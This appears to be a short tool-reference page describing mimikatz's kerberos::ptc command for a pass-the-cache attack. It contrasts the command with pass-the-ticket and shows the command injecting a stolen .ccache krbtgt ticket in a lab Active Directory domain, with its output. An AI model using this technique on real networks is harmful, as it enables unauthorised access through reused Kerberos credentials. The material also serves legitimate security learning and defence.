# ptc

`kerberos::ptc` can be used to [pass the cache](https://www.thehacker.recipes/ad/movement/kerberos/ptc). This is similar to [`kerberos::ptt`](ptt.md) that does pass the ticket but is different in the sense that the ticket used is a `.ccache` ticket instead of a `.kirbi` one.

```
mimikatz # kerberos::ptc m3g9tr0n@HACKLAB.LOCAL_krbtgt~HACKLAB.LOCAL@HACKLAB.LOCAL.ccache

Principal : (01) : m3g9tr0n ; @ HACKLAB.LOCAL

Data 0
           Start/End/MaxRenew: 17/11/2021 21:48:12 ; 18/11/2021 07:48:12 ; 24/11/2021 12:03:10
           Service Name (02) : krbtgt ; HACKLAB.LOCAL ; @ HACKLAB.LOCAL
           Target Name  (02) : krbtgt ; HACKLAB.LOCAL ; @ HACKLAB.LOCAL
           Client Name  (01) : m3g9tr0n ; @ HACKLAB.LOCAL
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0000000000000000000000000000000000000000000000000000000000000000
           Ticket            : 0x00000000 - null              ; kvno = 2        [...]
           * Injecting ticket : OK
```
